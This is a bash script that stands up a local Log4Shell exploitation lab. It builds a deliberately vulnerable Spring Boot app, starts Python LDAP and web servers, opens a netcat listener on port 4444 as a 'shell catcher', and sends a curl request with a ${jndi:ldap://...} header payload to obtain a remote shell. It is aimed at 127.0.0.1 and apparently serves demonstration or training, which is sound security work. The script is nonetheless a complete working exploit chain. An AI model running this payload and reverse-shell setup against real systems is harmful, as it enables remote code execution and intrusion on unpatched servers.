#!/bin/bash

# check for unzip
which unzip

# install java 8u131
wget -c --header "Cookie: oraclelicense=accept-securebackup-cookie" http://download.oracle.com/otn-pub/java/jdk/8u131-b11/d54c1d3a095b4ff2b6607d096fa80163/jdk-8u131-linux-x64.tar.gz
mkdir -p /usr/java
sudo tar -xvzf jdk-8u131-linux-x64.tar.gz -C /usr/java
export JAVA_HOME=/usr/java/jdk1.8.0_131/
sudo update-alternatives --install /usr/bin/java java ${JAVA_HOME%*/}/bin/java 20000
sudo update-alternatives --install /usr/bin/javac javac ${JAVA_HOME%*/}/bin/javac 20000

java -version

# download gradle 7.3.1
wget https://services.gradle.org/distributions/gradle-7.3.1-bin.zip

mkdir /opt/gradle
unzip -d /opt/gradle gradle-7.3.1-bin.zip
export PATH=$PATH:/opt/gradle/gradle-7.3.1/bin
gradle --version

git clone https://github.com/christophetd/log4shell-vulnerable-app
cd log4shell-vulnerable-app
gradle bootJar --no-daemon

# copy java jar
mkdir /app
cp build/libs/*.jar /app/spring-boot-application.jar

# python requirements
python3 -m pip install -r requirements.txt

# python ldap server (note webserver hard coded to 8001)
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj "/C=US/ST=California/L=San Francisco/O=Example Inc./OU=IT Department/CN=example.com"
python3 ldap.py 8000 &

# python web server
python3 web.py 8001 &

# java log4j vulnerable app (default is 8080)
java -jar /app/spring-boot-application.jar &

# shell catcher (this is hard coded in Exploit.java class)
nc -nlv 4444

# create the remote shell
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:8000/cn=bob,ou=people,dc=example,dc=org}'

